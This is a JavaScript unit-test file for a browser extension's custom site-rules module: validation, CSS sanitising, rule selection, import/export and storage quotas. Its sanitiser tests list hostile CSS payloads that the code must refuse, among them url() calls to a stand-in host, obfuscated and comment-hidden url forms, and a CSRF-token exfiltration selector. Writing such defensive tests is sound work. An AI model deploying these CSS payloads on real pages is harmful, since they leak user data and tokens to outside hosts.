// 用户站点规则（shared/custom-rules.js）。
//
// 读、写、缓存、增量由 SyncCollection 给出，那一份在 sync-collection.test.mjs 里测；
// 这一组测规则自己的语义：形状校验、CSS 清洗、胜出规则、导入导出、四种写入、
// 三道额度，以及错误一律是 i18n 键。
import test from 'node:test';
import assert from 'node:assert/strict';

await import('../../shared/lang-tags.js');
await import('../../shared/site-rules-builtin.js');
await import('../../shared/storage-writer.js');
await import('../../shared/site-rules.js');
await import('../../shared/sync-collection.js');
await import('../../shared/custom-rules.js');
const { CustomRules } = globalThis;

// 一个够用的 chrome.storage.sync。
function fakeSync(initial = {}) {
  const data = JSON.parse(JSON.stringify(initial));
  const calls = { set: [], remove: [] };
  return {
    data,
    calls,
    chrome: {
      storage: {
        sync: {
          get: async () => JSON.parse(JSON.stringify(data)),
          set: async (items) => {
            calls.set.push(items);
            Object.assign(data, JSON.parse(JSON.stringify(items)));
          },
          remove: async (keys) => {
            calls.remove.push(keys);
            for (const key of keys) delete data[key];
          },
        },
      },
    },
  };
}

function withChrome(chrome, run) {
  const saved = globalThis.chrome;
  globalThis.chrome = chrome;
  return Promise.resolve().then(run).finally(() => {
    globalThis.chrome = saved;
  });
}

function captureConsole(method) {
  const calls = [];
  const saved = console[method];
  console[method] = (...args) => calls.push(args);
  return { calls, restore: () => { console[method] = saved; } };
}

const write = (kind, payload) => CustomRules.applyWrite(Object.assign({ type: 'CUSTOM_RULES_WRITE', kind }, payload));
const rejectsWith = (promise, key) => assert.rejects(promise, { message: key });

// ------------------------------------------------------------ validateRule

test('custom-rules: validateRule normalizes the match, drops unknown fields and empty groups', () => {
  const rule = CustomRules.validateRule({
    id: 'ignored',
    v: 1,
    match: ['WWW.Example.COM.', 'docs.example.com/guide/*', 'example.com'],
    include: ['  article.post  ', 'article.post'],
    exclude: [],
    css: '.x { color: red }',
    engine: 'ai',
    colour: 'unknown field',
    updatedAt: 5,
  });
  assert.deepEqual(rule, {
    v: 1,
    match: ['example.com', 'docs.example.com/guide/*'],
    include: ['article.post'],
    css: '.x { color: red }',
    engine: 'ai',
    updatedAt: 5,
  });
});

test('custom-rules: validateRule refuses with the i18n key that names the problem', () => {
  const ok = { match: ['example.com'], exclude: ['.ad'] };
  const cases = [
    [null, 'customRuleInvalid'],
    [[], 'customRuleInvalid'],
    [{ ...ok, v: 2 }, 'customRuleInvalid'],
    [{ match: ['example.com'] }, 'customRuleInvalid'],
    [{ match: ['example.com'], include: [], css: '   ' }, 'customRuleInvalid'],
    [{ ...ok, engine: 'gpt' }, 'customRuleInvalid'],
    [{ ...ok, match: [] }, 'customRuleMatchInvalid'],
    [{ ...ok, match: 'example.com' }, 'customRuleMatchInvalid'],
    [{ ...ok, match: ['*.example.com'] }, 'customRuleMatchInvalid'],
    [{ ...ok, match: ['/only/a/path'] }, 'customRuleMatchInvalid'],
    [{ ...ok, match: [''] }, 'customRuleMatchInvalid'],
    [{ ...ok, match: Array.from({ length: 9 }, (_, i) => `h${i}.com`) }, 'customRuleMatchInvalid'],
    [{ ...ok, exclude: ['   '] }, 'customRuleSelectorInvalid'],
    [{ ...ok, exclude: [42] }, 'customRuleSelectorInvalid'],
    [{ ...ok, exclude: 'a' }, 'customRuleSelectorInvalid'],
    [{ ...ok, exclude: ['a'.repeat(501)] }, 'customRuleSelectorInvalid'],
    [{ ...ok, exclude: Array.from({ length: 51 }, (_, i) => `.c${i}`) }, 'customRuleSelectorInvalid'],
    [{ ...ok, css: 'body { background: url(x) }' }, 'customRuleCssUnsafe'],
    [{ ...ok, css: 7 }, 'customRuleCssUnsafe'],
  ];
  for (const [rule, key] of cases) {
    assert.throws(() => CustomRules.validateRule(rule), { message: key }, JSON.stringify(rule));
  }
  // 上限本身是合法的。
  assert.ok(CustomRules.validateRule({ ...ok, match: Array.from({ length: 8 }, (_, i) => `h${i}.com`) }));
  assert.ok(CustomRules.validateRule({ ...ok, exclude: ['a'.repeat(500)] }));
});

test('custom-rules: checkSelector is asked only where a DOM exists, and a no is customRuleSelectorInvalid', () => {
  const asked = [];
  const checkSelector = (selector) => {
    asked.push(selector);
    return selector !== 'div[';
  };
  assert.ok(CustomRules.validateRule({ match: ['a.com'], keepOriginal: ['.brand'] }, { checkSelector }));
  assert.throws(
    () => CustomRules.validateRule({ match: ['a.com'], keepOriginal: ['div['] }, { checkSelector }),
    { message: 'customRuleSelectorInvalid' },
  );
  assert.deepEqual(asked, ['.brand', 'div[']);
  // SW 不传：只查形状和长度。
  assert.ok(CustomRules.validateRule({ match: ['a.com'], keepOriginal: ['div['] }));
});

// ------------------------------------------------------------ sanitizeCss

test('custom-rules: sanitizeCss refuses every form that can make a request, and never rewrites', () => {
  const unsafe = [
    'body { background: url(http://x/leak) }',
    'body { background: URL(http://x/leak) }',
    'body { background: u/**/rl(http://x/leak) }',
    'body { background: url /* gap */ (x) }',
    'body { background: image-set("a.png" 1x) }',
    'body { background: image("a.png") }',
    'body { background: cross-fade(a, b) }',
    'body { background: src("a.png") }',
    'a::after { content: attr(href) }',
    '@import "http://x/a.css";',
    '@IMPORT "http://x/a.css";',
    '@font-face { font-family: x }',
    'a::before { content: "\\201C" }',
    'body { background: u\\72l(x) }',
    `.a { color: red } ${'/* pad */'.repeat(500)}`,
    // 字符串对注释不透明：字符串里的 `/*` 不开注释，夹在中间的 url( 是活的（D-315）。
    'a { content: "/*" } body { background: url(https://x.test/leak) } b { content: "*/" }',
    'a { content: "/*" } body { background: url(https://x.test/leak) }',
    "a { content: '/*' } body { background: url(https://x.test/leak) } b { content: '*/' }",
    'a { content: "/*" } input[name=csrf][value^="a"] { background: url(https://x.test/a) } b { content: "*/" }',
    'a { content: "/*" } @font-face { font-family: x; src: local(y) } b { content: "*/" }',
    'a { content: "/* } body { background: url(https://x.test/leak) }',
    // 注释里写的也拒：不给注释开例外。
    '/* url( in a comment is refused too */ .ai-translator-inline-block { color: rgb(1, 2, 3) }',
  ];
  for (const css of unsafe) {
    assert.throws(() => CustomRules.sanitizeCss(css), { message: 'customRuleCssUnsafe' }, css);
  }
  const safe = '/* brand colour */ .ai-translator-inline-block { color: rgb(1, 2, 3) }';
  assert.equal(CustomRules.sanitizeCss(safe), safe, '只拒不改');
  const atLimit = `.a{color:red}${' '.repeat(4096 - 13)}`;
  assert.equal(atLimit.length, 4096);
  assert.equal(CustomRules.sanitizeCss(atLimit), atLimit);
  assert.throws(() => CustomRules.sanitizeCss(`${atLimit} `), { message: 'customRuleCssUnsafe' });
});

// ------------------------------------------------------------ pick

test('custom-rules: pick takes the longest matched pattern, then the newer rule, then the smaller id', () => {
  const rules = [
    { id: 'b', match: ['example.com'], updatedAt: 1, exclude: ['.x'] },
    { id: 'a', match: ['docs.example.com'], updatedAt: 1, exclude: ['.x'] },
    { id: 'c', match: ['other.org', 'docs.example.com/guide/*'], updatedAt: 1, exclude: ['.x'] },
  ];
  assert.equal(CustomRules.pick(rules, 'www.example.com', '/').id, 'b');
  assert.equal(CustomRules.pick(rules, 'docs.example.com', '/').id, 'a');
  assert.equal(CustomRules.pick(rules, 'docs.example.com', '/guide/intro').id, 'c', '最长的命中模式串胜');
  assert.equal(CustomRules.pick(rules, 'nowhere.net', '/'), null);

  const tie = [
    { id: 'z', match: ['example.com'], updatedAt: 1 },
    { id: 'y', match: ['example.com'], updatedAt: 2 },
  ];
  assert.equal(CustomRules.pick(tie, 'example.com', '/').id, 'y', '一样长取较新的');
  const fullTie = [
    { id: 'n', match: ['example.com'], updatedAt: 3 },
    { id: 'm', match: ['example.com'], updatedAt: 3 },
  ];
  assert.equal(CustomRules.pick(fullTie, 'example.com', '/').id, 'm', '再一样取 id 较小的');
  assert.equal(CustomRules.pick(fullTie.slice().reverse(), 'example.com', '/').id, 'm', '与顺序无关');
});

// ------------------------------------------------------------ collect / applyChanges

test('custom-rules: collect skips newer versions and bad keys, keeps unsafe CSS for the page to refuse; the id comes from the key', () => {
  const warn = captureConsole('warn');
  let rules;
  try {
    rules = CustomRules.collect({
      'customRule:aaaa1111': { v: 1, match: ['a.com'], exclude: ['.x'], id: 'forged', updatedAt: 1 },
      'customRule:bbbb2222': { v: 2, match: ['a.com'], exclude: ['.x'], newField: true },
      'customRule:cccc3333': { v: 1, match: ['a.com'], css: 'body{background:url(x)}' },
      'customRule:dddd4444': { match: ['a.com'], exclude: ['.x'] },
      siteRules: {},
    });
  } finally {
    warn.restore();
  }
  // 绕过写入口写进去的不安全 CSS 不让整条规则作废（设计 :199 decode 只查形状、
  // §3.5 内容侧清洗不过只丢 CSS）：条目留着，CSS 原样带着，挂载前再拒。
  assert.deepEqual(rules.map((rule) => ({ ...rule })), [
    { v: 1, match: ['a.com'], exclude: ['.x'], updatedAt: 1, id: 'aaaa1111' },
    { v: 1, match: ['a.com'], css: 'body{background:url(x)}', id: 'cccc3333' },
  ]);
  assert.throws(() => CustomRules.sanitizeCss(rules[1].css), { message: 'customRuleCssUnsafe' });
  assert.equal(warn.calls.length, 1);
  assert.match(warn.calls[0][0], /customRule: collect: skipped 2/);
});

test('custom-rules: applyChanges adds, replaces and removes, and ignores other hosts', () => {
  const start = [{ v: 1, match: ['a.com'], exclude: ['.x'], id: 'aaaa1111' }];
  const next = CustomRules.applyChanges(start, {
    'customRule:aaaa1111': { oldValue: {}, newValue: { v: 1, match: ['a.com'], exclude: ['.y'] } },
    'customRule:bbbb2222': { newValue: { v: 1, match: ['b.com'], exclude: ['.z'] } },
    'customRule:cccc3333': { newValue: { v: 1, match: ['sub.a.com', 'b.com'], engine: 'ai' } },
  }, 'sub.a.com');
  assert.deepEqual(next.map((rule) => [rule.id, rule.exclude || rule.engine]), [
    ['aaaa1111', ['.y']],
    ['cccc3333', 'ai'],
  ]);
  assert.deepEqual(start[0].exclude, ['.x'], '纯函数：不改传入的数组');
  const removed = CustomRules.applyChanges(next, { 'customRule:aaaa1111': { oldValue: {} } }, 'sub.a.com');
  assert.deepEqual(removed.map((rule) => rule.id), ['cccc3333']);
});

// ------------------------------------------------------------ 额度

function ruleOfBytes(id, bytes) {
  const base = { v: 1, match: ['a.com'], css: '' };
  const overhead = new TextEncoder().encode(`customRule:${id}`).length
    + new TextEncoder().encode(JSON.stringify(base)).length;
  return { id, v: 1, match: ['a.com'], css: 'x'.repeat(bytes - overhead) };
}

test('custom-rules: the three quota limits are 6 KiB a rule, 24 KiB in all and 50 rules', () => {
  assert.equal(CustomRules.LIMITS.ruleBytes, 6144);
  assert.equal(CustomRules.LIMITS.totalBytes, 24576);
  assert.equal(CustomRules.LIMITS.maxRules, 50);

  const one = ruleOfBytes('aaaa0000', 6144);
  assert.equal(CustomRules.usage([one]).bytes, 6144);
  CustomRules.assertFits([one]);
  assert.throws(() => CustomRules.assertFits([ruleOfBytes('aaaa0000', 6145)]), { message: 'customRuleTooLarge' });

  const four = ['a', 'b', 'c', 'd'].map((c) => ruleOfBytes(c.repeat(8), 6144));
  CustomRules.assertFits(four);
  const five = four.concat(ruleOfBytes('eeeeeeee', 100));
  assert.throws(() => CustomRules.assertFits(five), { message: 'customRulesBudgetFull' });

  const small = (i) => ({ id: `r${String(i).padStart(7, '0')}`, v: 1, match: ['a.com'], engine: 'ai' });
  const fifty = Array.from({ length: 50 }, (_, i) => small(i));
  CustomRules.assertFits(fifty);
  assert.throws(() => CustomRules.assertFits(fifty.concat(small(50))), { message: 'customRulesBudgetFull' });
});

// ------------------------------------------------------------ 导入导出

const file = (rules, over = {}) => Object.assign({ format: 'blab-site-rules', version: 1, exportedAt: 1, rules }, over);

test('custom-rules: mergeImport merges by id, stamps now, counts AI rules', () => {
  const existing = [
    { id: 'aaaa1111', v: 1, match: ['a.com'], exclude: ['.old'], updatedAt: 1 },
    { id: 'bbbb2222', v: 1, match: ['b.com'], exclude: ['.keep'], updatedAt: 1 },
  ];
  const before = Date.now();
  const merged = CustomRules.mergeImport(existing, file([
    { id: 'aaaa1111', match: ['a.com'], exclude: ['.new'], engine: 'ai', updatedAt: 1 },
    { id: 'cccc3333', match: ['c.com'], include: ['main'], engine: 'ai' },
    { match: ['d.com'], engine: 'builtin' },
  ]));
  assert.equal(merged.added, 2);
  assert.equal(merged.replaced, 1);
  assert.equal(merged.aiCount, 2);
  const byMatch = Object.fromEntries(merged.rules.map((rule) => [rule.match[0], rule]));
  assert.deepEqual(byMatch['a.com'].exclude, ['.new']);
  assert.equal(byMatch['a.com'].id, 'aaaa1111');
  assert.ok(byMatch['a.com'].updatedAt >= before, '导入的规则 updatedAt 记为现在');
  assert.equal(byMatch['b.com'], existing[1], '没被文件动过的保持原样');
  assert.equal(byMatch['c.com'].id, 'cccc3333');
  assert.match(byMatch['d.com'].id, /^[0-9a-z]{8}$/);
});

test('custom-rules: mergeImport is all or nothing, with the per-rule reason as the cause', async () => {
  const bad = [
    null,
    file([], { format: 'something-else' }),
    file([], { version: 2 }),
    file('not an array'),
  ];
  for (const f of bad) {
    assert.throws(() => CustomRules.mergeImport([], f), { message: 'customRulesImportInvalid' });
  }
  try {
    CustomRules.mergeImport([], file([
      { match: ['a.com'], exclude: ['.ok'] },
      { match: ['b.com'], css: 'body { background: url(x) }' },
    ]));
    assert.fail('should throw');
  } catch (error) {
    assert.equal(error.message, 'customRulesImportInvalid');
    assert.equal(error.cause.message, 'customRuleCssUnsafe');
  }
  assert.throws(
    () => CustomRules.mergeImport([], file([{ id: 'BAD ID', match: ['a.com'], engine: 'ai' }])),
    (error) => error.message === 'customRulesImportInvalid' && error.cause.message === 'customRuleInvalid',
  );
  assert.throws(
    () => CustomRules.mergeImport([], file([
      { id: 'dupe0000', match: ['a.com'], engine: 'ai' },
      { id: 'dupe0000', match: ['b.com'], engine: 'ai' },
    ])),
    { message: 'customRulesImportInvalid' },
  );
  // 字符串里的 `/*` 藏起来的 url( 也让整包作废，存储一个字节不动（D-315）。
  const hidden = 'a { content: "/*" } body { background: url(https://x.test/leak) } b { content: "*/" }';
  const smuggled = file([
    { match: ['a.com'], exclude: ['.ok'] },
    { match: ['b.com'], css: hidden },
  ]);
  assert.throws(
    () => CustomRules.mergeImport([], smuggled),
    (error) => error.message === 'customRulesImportInvalid' && error.cause.message === 'customRuleCssUnsafe',
  );
  const sync = fakeSync({ 'customRule:keep0000': { v: 1, match: ['k.com'], engine: 'ai' } });
  const before = JSON.stringify(sync.data);
  await withChrome(sync.chrome, async () => {
    await rejectsWith(write('import', { file: smuggled }), 'customRulesImportInvalid');
  });
  assert.equal(JSON.stringify(sync.data), before);
  assert.equal(sync.calls.set.length, 0);
  assert.equal(sync.calls.remove.length, 0);
});

test('custom-rules: mergeImport checks the quota on the merged result', () => {
  const existing = Array.from({ length: 49 }, (_, i) => ({
    id: `r${String(i).padStart(7, '0')}`, v: 1, match: ['a.com'], engine: 'ai',
  }));
  assert.equal(CustomRules.mergeImport(existing, file([{ match: ['b.com'], engine: 'ai' }])).rules.length, 50);
  assert.throws(
    () => CustomRules.mergeImport(existing, file([{ match: ['b.com'], engine: 'ai' }, { match: ['c.com'], engine: 'ai' }])),
    { message: 'customRulesBudgetFull' },
  );
});

test('custom-rules: toExportFile carries the id on each rule and round-trips through mergeImport', () => {
  const rules = [{ id: 'aaaa1111', v: 1, match: ['a.com'], exclude: ['.x'], updatedAt: 1 }];
  const out = CustomRules.toExportFile(rules);
  assert.equal(out.format, 'blab-site-rules');
  assert.equal(out.version, 1);
  assert.ok(Number.isFinite(out.exportedAt));
  assert.deepEqual(Object.keys(out.rules[0])[0], 'id');
  const merged = CustomRules.mergeImport(rules, JSON.parse(JSON.stringify(out)));
  assert.equal(merged.added, 0);
  assert.equal(merged.replaced, 1, '导出 → 导入是幂等的');
});

test('custom-rules: toExportFile orders rules by first match, then id, whatever order they come in', () => {
  const rules = [
    { id: 'zz000001', v: 1, match: ['b.com'], engine: 'ai' },
    { id: 'aa000002', v: 1, match: ['a.com', 'z.com'], engine: 'ai' },
    { id: 'mm000003', v: 1, match: ['b.com'], exclude: ['.x'] },
    { id: 'bb000004', v: 1, match: ['a.com'], keepOriginal: ['.y'] },
  ];
  const expected = ['aa000002', 'bb000004', 'mm000003', 'zz000001'];
  // 四条的全部 24 种排列，输出都是同一个顺序；输入数组本身不被改动。
  const permute = (list) => (list.length <= 1 ? [list] : list.flatMap((item, i) => (
    permute([...list.slice(0, i), ...list.slice(i + 1)]).map((rest) => [item, ...rest])
  )));
  for (const order of permute(rules)) {
    const before = order.map((rule) => rule.id);
    assert.deepEqual(CustomRules.toExportFile(order).rules.map((rule) => rule.id), expected);
    assert.deepEqual(order.map((rule) => rule.id), before);
  }
});

// 顺序不跟界面语言走（R1-S-6）：大小写混排、带非 ASCII 的匹配串按码位排，
// 大写在小写前、ä 在 z 后、汉字最后；同一个匹配串再按 id 的码位排。
test('custom-rules: compareRules orders by code point, not by locale', () => {
  const rules = [
    { id: 'aa000001', v: 1, match: ['例子.com'], engine: 'ai' },
    { id: 'aa000002', v: 1, match: ['ä.com'], engine: 'ai' },
    { id: 'aa000003', v: 1, match: ['a.com'], engine: 'ai' },
    { id: 'aa000004', v: 1, match: ['Z.com'], engine: 'ai' },
    { id: 'b0000005', v: 1, match: ['B.com'], engine: 'ai' },
    { id: 'a0000006', v: 1, match: ['B.com'], engine: 'ai' },
    { id: 'aa000007', v: 1, match: ['z.com'], engine: 'ai' },
  ];
  const byCodePoint = rules.slice().sort((a, b) => {
    const [x, y] = [a.match[0], b.match[0]];
    if (x !== y) return x < y ? -1 : 1;
    return a.id < b.id ? -1 : 1;
  }).map((rule) => rule.id);
  const expected = ['a0000006', 'b0000005', 'aa000004', 'aa000003', 'aa000007', 'aa000002', 'aa000001'];
  assert.deepEqual(byCodePoint, expected);
  assert.deepEqual(rules.slice().sort(CustomRules.compareRules).map((rule) => rule.id), expected);
  assert.deepEqual(CustomRules.toExportFile(rules.slice().reverse()).rules.map((rule) => rule.id), expected);
});

// ------------------------------------------------------------ 写入

test('custom-rules write put: a new rule gets an id, lands without it in the value, and is stamped', async () => {
  const sync = fakeSync();
  await withChrome(sync.chrome, async () => {
    const { id } = await write('put', { rule: { match: ['example.com'], keepOriginal: ['.brand'], id: undefined } });
    assert.match(id, /^[0-9a-z]{8}$/);
    const stored = sync.data[`customRule:${id}`];
    assert.equal(stored.id, undefined, 'id 只在键里');
    assert.deepEqual(stored.keepOriginal, ['.brand']);
    assert.ok(Number.isFinite(stored.updatedAt));
    // 同 id 再 put 是整条替换。
    await write('put', { rule: { id, match: ['example.com'], engine: 'ai' } });
    assert.deepEqual(Object.keys(sync.data), [`customRule:${id}`]);
    assert.equal(sync.data[`customRule:${id}`].keepOriginal, undefined);
    assert.equal(sync.data[`customRule:${id}`].engine, 'ai');
  });
});

test('custom-rules write: refusals are i18n keys and nothing is written', async () => {
  const sync = fakeSync();
  await withChrome(sync.chrome, async () => {
    await rejectsWith(write('put', { rule: { match: ['a.com'] } }), 'customRuleInvalid');
    await rejectsWith(write('put', { rule: { id: 'NOT/AN/ID', match: ['a.com'], engine: 'ai' } }), 'customRuleInvalid');
    await rejectsWith(write('put', { rule: { match: ['a.com'], css: '@import "x"' } }), 'customRuleCssUnsafe');
    await rejectsWith(write('put', { rule: { match: ['*.a.com'], engine: 'ai' } }), 'customRuleMatchInvalid');
    await rejectsWith(write('remove', { id: '' }), 'customRuleInvalid');
    await rejectsWith(write('addSelector', { host: 'a.com', path: '/', field: 'atomic', selector: '.x' }), 'customRuleInvalid');
    await rejectsWith(write('addSelector', { host: 'a.com', path: '/', field: 'exclude', selector: '  ' }), 'customRuleSelectorInvalid');
    await rejectsWith(write('addSelector', { host: '', path: '/', field: 'exclude', selector: '.x' }), 'customRuleMatchInvalid');
    await rejectsWith(write('import', { file: { format: 'nope' } }), 'customRulesImportInvalid');
  });
  assert.equal(sync.calls.set.length, 0);
  assert.equal(sync.calls.remove.length, 0);
});

test('custom-rules write: an unexpected failure becomes customRuleSaveFailed, logged once with the original error', async () => {
  const sync = fakeSync();
  const boom = new Error('QUOTA_BYTES_PER_ITEM quota exceeded');
  sync.chrome.storage.sync.set = async () => { throw boom; };
  const error = captureConsole('error');
  try {
    await withChrome(sync.chrome, async () => {
      await rejectsWith(write('put', { rule: { match: ['a.com'], engine: 'ai' } }), 'customRuleSaveFailed');
    });
  } finally {
    error.restore();
  }
  assert.equal(error.calls.length, 1);
  assert.match(error.calls[0][0], /CustomRules put write failed/);
  assert.equal(error.calls[0][1], boom);
});

test('custom-rules write: quota refusals come back as their own keys', async () => {
  const big = { match: ['a.com'], css: `.a{color:red}${' '.repeat(4000)}`, keepOriginal: Array.from({ length: 50 }, (_, i) => `.k${i}-${'x'.repeat(60)}`) };
  const sync = fakeSync();
  await withChrome(sync.chrome, async () => {
    await rejectsWith(write('put', { rule: big }), 'customRuleTooLarge');
  });
  const full = {};
  for (let i = 0; i < 50; i += 1) full[`customRule:r${String(i).padStart(7, '0')}`] = { v: 1, match: ['a.com'], engine: 'ai' };
  const fullSync = fakeSync(full);
  await withChrome(fullSync.chrome, async () => {
    await rejectsWith(write('put', { rule: { match: ['b.com'], engine: 'ai' } }), 'customRulesBudgetFull');
  });
});

test('custom-rules write remove: deletes one rule', async () => {
  const sync = fakeSync({
    'customRule:aaaa1111': { v: 1, match: ['a.com'], engine: 'ai' },
    'customRule:bbbb2222': { v: 1, match: ['b.com'], engine: 'ai' },
  });
  await withChrome(sync.chrome, async () => {
    await write('remove', { id: 'aaaa1111' });
  });
  assert.deepEqual(Object.keys(sync.data), ['customRule:bbbb2222']);
  assert.deepEqual(sync.calls.remove, [['customRule:aaaa1111']]);
});

test('custom-rules write import: one multi-key set with only what the file changed', async () => {
  const sync = fakeSync({
    'customRule:aaaa1111': { v: 1, match: ['a.com'], exclude: ['.old'], updatedAt: 1 },
    'customRule:bbbb2222': { v: 1, match: ['b.com'], exclude: ['.keep'], updatedAt: 1 },
  });
  let result;
  await withChrome(sync.chrome, async () => {
    result = await write('import', { file: file([
      { id: 'aaaa1111', match: ['a.com'], exclude: ['.new'] },
      { match: ['c.com'], engine: 'ai' },
    ]) });
  });
  assert.deepEqual(result, { added: 1, replaced: 1 });
  assert.equal(sync.calls.set.length, 1, '一次多键 set');
  const written = Object.keys(sync.calls.set[0]);
  assert.equal(written.length, 2);
  assert.ok(written.includes('customRule:aaaa1111'));
  assert.ok(!written.includes('customRule:bbbb2222'));
  assert.deepEqual(sync.data['customRule:aaaa1111'].exclude, ['.new']);
});

test('custom-rules write addSelector: appends to the winning rule without duplicates, else creates one for the host', async () => {
  const sync = fakeSync({
    'customRule:aaaa1111': { v: 1, match: ['example.com'], exclude: ['.ad'], updatedAt: 1 },
    'customRule:bbbb2222': { v: 1, match: ['example.com/docs/*'], include: ['main'], updatedAt: 1 },
  });
  await withChrome(sync.chrome, async () => {
    const first = await write('addSelector', { host: 'www.example.com', path: '/docs/a', field: 'keepOriginal', selector: '.brand' });
    assert.deepEqual(first, { id: 'bbbb2222' }, '追加到这个 URL 的胜出规则');
    assert.deepEqual(sync.data['customRule:bbbb2222'].keepOriginal, ['.brand']);
    assert.ok(sync.data['customRule:bbbb2222'].updatedAt > 1);

    const sets = sync.calls.set.length;
    const again = await write('addSelector', { host: 'example.com', path: '/docs/b', field: 'keepOriginal', selector: ' .brand ' });
    assert.deepEqual(again, { id: 'bbbb2222' });
    assert.equal(sync.calls.set.length, sets, '已有就不写');

    const created = await write('addSelector', { host: 'WWW.Other.org', path: '/', field: 'exclude', selector: '.x' });
    const stored = sync.data[`customRule:${created.id}`];
    assert.deepEqual(stored.match, ['other.org'], '新建的规则只认这台主机（normalizeHost）');
    assert.deepEqual(stored.exclude, ['.x']);
  });
});

test('custom-rules: newId is the collection one, 8 base36 characters', () => {
  assert.match(CustomRules.newId(), /^[0-9a-z]{8}$/);
  assert.equal(CustomRules.KEY_PREFIX, 'customRule:');
});

test('custom-rules: loading without SiteRules, StorageWriter or SyncCollection throws', async () => {
  const { readFileSync } = await import('node:fs');
  const source = readFileSync(new URL('../../shared/custom-rules.js', import.meta.url), 'utf8');
  const { SiteRules, StorageWriter, SyncCollection } = globalThis;
  assert.throws(() => new Function('globalThis', source)({ StorageWriter, SyncCollection }), /site-rules/);
  assert.throws(() => new Function('globalThis', source)({ SiteRules, SyncCollection }), /storage-writer/);
  assert.throws(() => new Function('globalThis', source)({ SiteRules, StorageWriter }), /sync-collection/);
});
